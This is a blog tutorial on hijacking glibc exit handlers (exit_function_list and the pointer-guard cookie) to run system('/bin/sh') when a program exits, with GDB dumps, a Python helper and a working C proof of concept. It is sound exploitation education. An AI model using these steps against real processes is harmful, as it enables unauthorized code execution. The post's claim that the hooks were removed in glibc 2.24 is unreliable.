---
layout: post-linenums
title: "Code execution part 1: from exit to system"
author: "Nox"
description: "Executing system at the end of program execution"
keywords: "pwn, exploiting"
date: 2024-06-11 00:00:00 -0500
categories: exploiting 
lang: en 
lang-ref: code-exec-part1-from-exit-to-sytem
---

After a long break from reversing and pwning, I'm getting back into the groove. My mind is gradually getting used to the hustle, and I'm starting to enjoy it. I fondly remember the good times when I played CTF every weekend with the amn3s1a team. Although I barely solved any challenges at the beginning, I enjoyed it and learned that my mind became "quicker" each weekend I played. Many things have changed since 2013 when I played with my team, especially since I spent years professionally exploiting the Windows kernel. Now, I'm attempting to shift my focus to Linux/*os. Therefore, I will try to learn the techniques currently in use, even if they have been known for decades, and this is one of them.

<!--more-->

Since version 2.24 of glibc, the hooks `__realloc_hook`, `__memalign_hook`, `__malloc_hook`, and `__free_hook`, which allowed nearly any function to be executed by overwriting it, have been removed. This necessitated the search for new methods to execute code. One such method involves using the `exit()` function or the `return` statement that is executed when a program terminates. 


The following methods are being tested in glibc 2.35 and 2.39 (which is the latest version as of May 2024). Of course, I did not create these methods—they are quite old—but they still work, so I am including the references [here][1] and [here][2]. I will also add what I learned during my research and discuss some scenarios in which they can be used.

### Code execution via `exit_function_list`


In this post, we will discuss a method that can be used within the `__run_exit_handlers()` function, specifically focusing on the `exit_function_list` structure. There is also another structure called `tls_dtor_list`, but we will leave that for a future post. But first, let's talk about how we arrived at the function that this subtitle decorates.

During the process of a program's exit, which can be triggered by calling the `exit()` function or the return statement from the main thread, glibc executes, among other things, the `__run_exit_handlers()` function. This function calls any registered destructors, also known as `dtors`.

`exit()` is merely a wrapper for `__run_exit_handlers()`.

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)
```

[`__run_exit_handlers`][4] looks like this

```c
/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
  if (run_dtors)
    call_function_static_weak (__call_tls_dtors);

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur;

    restart:
      cur = *listp;

      if (cur == NULL)
	{
	  /* Exit processing complete.  We will not allow any more
	     atexit/on_exit registrations.  */
	  __exit_funcs_done = true;
	  break;
	}

      while (cur->idx > 0)
	{
	  struct exit_function *const f = &cur->fns[--cur->idx];
	  const uint64_t new_exitfn_called = __new_exitfn_called;

	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);
	      void *arg;

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
	      arg = f->func.on.arg;
	      PTR_DEMANGLE (onfct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      onfct (status, arg);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_at:
	      atfct = f->func.at;
	      PTR_DEMANGLE (atfct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      atfct ();
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
	      PTR_DEMANGLE (cxafct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    }

	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	    /* The last exit function, or another thread, has registered
	       more exit functions.  Start the loop over.  */
	    goto restart;
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);
    }

  __libc_lock_unlock (__exit_funcs_lock);

  if (run_list_atexit)
    call_function_static_weak (_IO_cleanup);

  _exit (status);
}
```

At the beginning of the function, on line **11**, the function `__call_tls_dtors` is called if there are registered destructors — we will discuss this other post. Following this, we encounter a switch statement, and we will focus on the `case ef_cxa:` on line **68**. Why? That's what we will discuss next.

#### Exploiting `exit_function_list` 
Upon entering the `__run_exit_handlers` function, one of its parameters is a pointer to a pointer of the `exit_function_list` structure. After traversing this list, a function pointer and an argument are obtained from the `exit_function` structure, depending on the case, as the structure contains unions.

Let's take a look at the `exit.h` [header file][5]

```
enum
{
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
	void (*at) (void);
	struct
	  {
	    void (*fn) (int status, void *arg);
	    void *arg;
	  } on;
	struct
	  {
	    void (*fn) (void *arg, int status);
	    void *arg;
	    void *dso_handle;
	  } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```

If we create a simple program that only prints "Hello, World!" and inspect the memory to see the contents of `__exit_funcs`, which fortunately has a symbol to help us locate it, we observe the following:

```
gef> x/10xg __exit_funcs
0x7ffff7e1bf00 <initial>:	    0x0000000000000000	0x0000000000000001
0x7ffff7e1bf10 <initial+16>:	0x0000000000000004	0x5b75ba599d12cfac
0x7ffff7e1bf20 <initial+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf30 <initial+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf40 <initial+64>:	0x0000000000000000	0x0000000000000000
```


Remember that `initial` contains the `exit_function_list` structure, and by default, GDB does not have a symbol for the former structure, but it does for the `exit_function` structure —and there can be up to 32 structures! In this case, we only have one. Thus, we have verified that even in a simple program, there is already an entry in `exit_function_list.fns[0]`. Let's traverse it a bit.

```
gef> p ((struct exit_function*)0x7ffff7e1bf10)->func.cxa
$1 = {
  fn = 0x5b75ba599d12cfac,
  arg = 0x0,
  dso_handle = 0x0
}
gef> p ((struct exit_function*)0x7ffff7e1bf10)->flavor 
$2 = 0x4
```

It is important to note that in line **7** of the enum in the exit.h header, there is the `ef_cxa` field with a value of `4`, which is exactly what we have in flavor, and in the function pointer `exit_function.func.cxa.fn`, there is no valid virtual address. Let's look again at the code that represents this in the `__run_exit_handlers` function.

<pre>
<code class="hljs language-c" data-ln-start-from="67">
        case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
	      PTR_DEMANGLE (cxafct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
</code>
</pre>


Before the function is called, on line **74**, a macro called `PTR_DEMANGLE` is used, and only after this, the function is called. Essentially, the pair `PTR_MANGLE` and `PTR_DEMANGLE` encrypt and decrypt the pointer, respectively. We can look at the macro or something simpler: examine the disassembly where it is used. To do this, we can click on the `PTR_MANGLE` macro in the [code][6], as well as `PTR_DEMANGLE`, to see where they are being used.

Among other functions, we can see the implementation of the `PTR_MANGLE` code in the [`__cxa_atexit`][7] function and `PTR_DEMANGLE` in the function we have been examining, `__run_exit_handlers`.

```c
int
__cxa_atexit (void (*func) (void *), void *arg, void *d)
{
  return __internal_atexit (func, arg, d, &__exit_funcs);
}
```

And a part of `__internal_atexit` is as following

```c
  PTR_MANGLE (func);
  new->func.cxa.fn = (void (*) (void *, int)) func;
  new->func.cxa.arg = arg;
  new->func.cxa.dso_handle = d;
  new->flavor = ef_cxa;
```

Its disassembly is

<pre>
<code class="hljs language-x86asm" data-highlighted="yes">   0x00007ffff7c45915 <+85>:	mov    QWORD PTR [rax],0x4
   0x00007ffff7c4591c <+92>:	mov    rdi,rbx
   0x00007ffff7c4591f <+95>:	xor    rdi,QWORD PTR fs:0x30
   0x00007ffff7c45928 <+104>:	rol    rdi,0x11
   0x00007ffff7c4592c <+108>:	movups XMMWORD PTR [rax+0x10],xmm2
   0x00007ffff7c45930 <+112>:	mov    QWORD PTR [rax+0x8],rdi
</code>
</pre>


The lines do not correspond exactly, but I'll indicate which ones do. Line **1** of the disassembly corresponds to line **5** of the C code, where the flavor we mentioned earlier is set; line **1** of the C code corresponds to lines **2**, **3**, **4**, and **6** of the disassembly, which is what interests us.

For `PTR_DEMANGLE`, we have the `__run_exit_handlers` function that we saw earlier.

```
   0x00007ffff7c454bf <+303>:	ror    rax,0x11
   0x00007ffff7c454c3 <+307>:	xor    rax,QWORD PTR fs:0x30
   0x00007ffff7c454cc <+316>:	xchg   DWORD PTR [r14],edx
   0x00007ffff7c454cf <+319>:	cmp    edx,0x1
   0x00007ffff7c454d2 <+322>:	jg     0x7ffff7c45580 <__run_exit_handlers+496>
   0x00007ffff7c454d8 <+328>:	call   rax
```

So the difference between encryption and decryption is the use of `rol` (rotate left) and `ror` (rotate right) respectively. Nonetheless, there's something interesting you might have already noticed: the use of `fs:[0x30]` in both operations. What is it? In Linux, the `fs` segment is used as Thread Local Storage (TLS) and contains runtime information about the current thread. Glibc [version 2.39][8] refers to `__pointer_chk_guard_local`, while in version 2.26 it also specifies `tbchead_t.ptr_guard`.

```c
typedef struct
{
  void *tcb;		/* Pointer to the TCB.  Not necessarily the
			   thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;		/* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  unsigned long int vgetcpu_cache[2];
# ifndef __ASSUME_PRIVATE_FUTEX
  int private_futex;
# else
  int __glibc_reserved1;
# endif
  int __glibc_unused1;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
  long int __glibc_reserved2;
  /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));

  void *__padding[8];
} tcbhead_t;
```

Now let's look at the memory pointed to by `fs`

```
      0x7ffff7fa4740|+0x0000|+000: 0x00007ffff7fa4740  ->  [loop detected]
      0x7ffff7fa4748|+0x0008|+001: 0x00007ffff7fa5160  ->  0x0000000000000001
      0x7ffff7fa4750|+0x0010|+002: 0x00007ffff7fa4740  ->  [loop detected]
      0x7ffff7fa4758|+0x0018|+003: 0x0000000000000000
      0x7ffff7fa4760|+0x0020|+004: 0x0000000000000000
      0x7ffff7fa4768|+0x0028|+005: 0x38c19d513064ee00  <-  canary
      0x7ffff7fa4770|+0x0030|+006: 0x67d652452ad05ec9  <-  PTR_MANGLE cookie
```

So, the key for encrypting and decrypting pointers is a cookie called `_pointer_chk_guard_local` or `pointer_guard`, and it is stored in `fs:[0x30]`. Based on what we've seen, we can conclude the following formulas for `PTR_MANGLE` and `PTR_DEMANGLE`.

```python
ptr_demangle = lambda ptr_enc : ror(ptr_enc, 0x11) ^ cookie 
ptr_mangle = lambda ptr: rol(ptr ^ cookie, 0x11)
```

Fortunetly, we have an entry in `exit_function_list.fns[0]` apparently by default, it seems. Let's take another look at it.

```
gef> x/10xg __exit_funcs
0x7ffff7e1bf00 <initial>:	    0x0000000000000000	0x0000000000000001
0x7ffff7e1bf10 <initial+16>:	0x0000000000000004	0x5b75ba599d12cfac
0x7ffff7e1bf20 <initial+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf30 <initial+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf40 <initial+64>:	0x0000000000000000	0x0000000000000000
gef> p ((struct exit_function*)0x7ffff7e1bf10)->func.cxa
$1 = {
  fn = 0x5b75ba599d12cfac,
  arg = 0x0,
  dso_handle = 0x0
}
gef> p ((struct exit_function*)0x7ffff7e1bf10)->flavor 
$2 = 0x4
```

Let's use the cookie and the `exit_function_list.fns[0].func.cxa.fn` value which is `0x5b75ba599d12cfac` to decrypt and get the pointer.

```
In [4]: cookie = 0x67d652452ad05ec9
In [5]: hex(ptr_demangle(0x5b75ba599d12cfac))
Out[5]: '0x7ffff7fc9040'
```

```
gef> x 0x7ffff7fc9040
0x7ffff7fc9040 <_dl_fini>:	0xe5894855fa1e0ff3
```

To automate this search and confirm that the `_dl_fini` function is the first item, you can use the following Python code with GDB. You can run it with the command `gdb /bin/ls -batch -ex 'source gdb.py'`.

```python
import gdb
import sys

is64 = True if gdb.lookup_type('void').pointer().sizeof ==8 else False
data_sz = 8 if is64 else 4
bits_deep = 64 if is64 else 32

def ror64(x, n):
    return ((x >> n) | (x << (64 - n))) & (1 << 64) - 1

def decrypt(ptr, key):
    return ror64(ptr, 0x11) ^ key

c = lambda : gdb.execute('c')
r = lambda : gdb.execute('r')
q = lambda : gdb.execute('q')

def get_eval(x):
    try:
        return gdb.parse_and_eval(f'{x}')
    except Exception as e:
        print("Error found: ", e)
        return None

def set_bp(addr):
    return gdb.Breakpoint(f'{addr}')

def read_memory(addr, size):
    return gdb.selected_inferior().read_memory(addr, size)

def execute(cmd):
    return gdb.execute(f'{cmd}')

def main():
    bp = set_bp('exit')
    r()

    ptr_guard = get_eval('*(void**)($fs_base+0x30)') # key
    if ptr_guard is None:
        q()
        print('Was not possible to get ptr_guard')
        return

    ptr_guard = int(ptr_guard)

    __exit_funcs_addr = get_eval('__exit_funcs')
    if __exit_funcs_addr is None:
        q()
        print('__exit_funcs exist?')
        return
    __exit_funcs_addr = int(__exit_funcs_addr)

    print('ptr_guard 0x%x' % ptr_guard)
    print('__exit_funcs_addr 0x%x' % __exit_funcs_addr)

    """
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
    """

    dummy_addr = __exit_funcs_addr + data_sz
    idx = int.from_bytes(read_memory(dummy_addr, data_sz), 'little')
    fns_size = gdb.lookup_type('struct exit_function').sizeof
    dummy_addr += data_sz

    for _ in range(idx):
        val = f'((struct exit_function*){dummy_addr})->flavor'
        flavor = int(get_eval(val))

        val = f'((struct exit_function*){dummy_addr})->func.cxa.fn'
        fn = int(get_eval(val))

        addr = decrypt(fn, ptr_guard)
        sym = gdb.execute(f'info sym {addr}', to_string=True)
        if "No symbol" in sym:
            print(f'flavor: {flavor}, fn: 0x{addr:x}')
        else:
            print(f'flavor: {flavor}, fn: 0x{addr:x} <{sym.split()[0]}>')

        dummy_addr += fns_size

if __name__ == '__main__':
    main()
```


```
$ sudo gdb /bin/ls -batch -ex 'source gdb.py'
Breakpoint 1 at 0x4c20
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142
142	./stdlib/exit.c: No such file or directory.

ptr_guard 0x24278a4b62350122
__exit_funcs_addr 0x7ffff7e1bf00
flavor: 4, fn: 0x7ffff7fc9040 <_dl_fini>
flavor: 4, fn: 0x55555555fa80
```

#### Possibles attacks

What we've seen up to this point is really interesting. As a preamble, I can say that a common technique used in exploit development is to obtain a memory leak with some virtual address belonging to glibc and/or ld, allowing the calculation of the virtual address of the `__exit_funcs` function and `_dl_fini`, although the latter belongs to ld. By obtaining the encrypted and decrypted pointers, we can derive the cookie.

```python
In [9]: hex(ror64(0x5b75ba599d12cfac, 0x11) ^ 0x7ffff7fc9040)
Out[9]: '0x67d652452ad05ec9'
```

Obtaining the cookie allows us to encrypt any pointer, such as the one for the `system` function, and with a write primitive, overwrite the modified pointer. Additionally, by writing `/bin/sh` to `exit_function_list.fns[0].cxa.arg`, we can obtain a shell.

```c
    printf("ld = %p\n", ld_addr);
    printf("libc = %p\n", libc_addr);

    struct exit_function_list* exit_funcs_list = (struct exit_function_list*)(libc_addr + 0x21bf00);
    printf("__exit_funcs = %p\n", exit_funcs_list);

    uint64_t _dl_fini_addr = (uint64_t)(ld_addr + 0x5b040);

    //uint64_t cookie = (*(uint64_t*)(ld_addr + 0x8f040)) - 0x53b70;
    uint64_t cookie = (uint64_t)(ld_addr + 0x3c740 + 0x30);

    cookie = *(uint64_t*)cookie;
    printf("cookie = 0x%lx\n", cookie);

    uint64_t fn = (uint64_t)exit_funcs_list->fns[0].func.cxa.fn;
    printf("_dl_fini encrypted = 0x%lx\n", fn);
    printf("_dl_fini decrypted = 0x%lx\n", _dl_fini_addr);

    uint64_t cookie2 = decrypt(fn, _dl_fini_addr);
    printf("cookie2 = 0x%lx\n", cookie2);

    assert(cookie == cookie2);

    uint64_t ptr_enc = encrypt((uint64_t)system, cookie2);
    printf("ptr_enc 0x%lx\n", ptr_enc);
    printf("system %p\n", system);

    exit_funcs_list->fns[0].func.cxa.fn = (void*)ptr_enc;
    exit_funcs_list->fns[0].func.cxa.arg = "/bin/sh";

    // trigger system("/bin/sh");
    return 0;
```

```
$ ./a.out 
Mama am here!
ld = 0x723f9c2b5000
libc = 0x723f9c000000
__exit_funcs = 0x723f9c21bf00
ptr cookie 0x723f9c2f1770
cookie = 0x9702d9c5fe9e5e08
_dl_fini encrypted = 0x57f4c55ebc912e05
_dl_fini decrypted = 0x723f9c310040
cookie2 = 0x9702d9c5fe9e5e08
ptr_enc 0x57f4c536a6f12e05
system 0x723f9c050d70
$ echo 'pwn'
pwn
$ 
```
You can see that I'm using the virtual address of ld, but sometimes a leak from glibc is sufficient because it is often located adjacent to ld, and by performing a brute force attack, successful execution can be achieved. Therefore, I emulate the necessary leaks to obtain `_dl_fini` and the value `exit_function_list.fns[0].cxa.fn` to calculate the cookie. Afterward, we encrypt the system pointer, overwrite the argument in `exit_function_list.fns[0].cxa.arg` with `/bin/sh`, and terminate the execution through `exit` or the `return` of the main thread.

Another possible attack is to overwrite the cookie with null bytes. This prevents us from needing to read the value of `exit_function_list.fns[n].cxa.fn` to obtain the cookie, as we have seen. Instead, we can use the virtual address of system and perform a `rol 0x11`. Then, when `PTR_DEMANGLE` is executed, it will use the null cookie, decrypt it by doing a ror 0x11, and execute the function pointer we previously placed.

Of course, one can always create a fake `exit_functions_list` structure if we have the primitives to do so.

As shown in the previous code, the cookie address is obtained via TLS located in `fs:[0x30]` with line **10**. How do we do this? Let's see.

The linker ld has a global variable [`__nptl_rtld_global`][10] that points to the global variable `_rtld_global`, which finally points to the [`rtld_global`][11] structure. Its first field is `_ns_loaded`, or you can directly use the ld address as a base and add the TLS offset as used in line **10**. Of course, one can always attempt to use the virtual address of glibc with brute force execution to match the offset.

```
[...]
0x00007ffff7e16000 0x00007ffff7e1a000 0x0000000000004000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7e1a000 0x00007ffff7e1c000 0x0000000000002000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7e1c000 0x00007ffff7e29000 0x000000000000d000 0x0000000000000000 rw- 
0x00007ffff7fa4000 0x00007ffff7fa7000 0x0000000000003000 0x0000000000000000 rw- <tls-th1>
```


> Written by **Nox**

[1]: https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
[2]: https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
[3]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L135
[4]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L35
[5]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.h
[6]: https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L25
[7]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/cxa_atexit.c#L52
[8]: https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L29
[9]: https://elixir.bootlin.com/glibc/glibc-2.26/source/sysdeps/x86_64/nptl/tls.h#L70
[10]: https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_create.c#L63
[11]: https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/generic/ldsodefs.h#L303
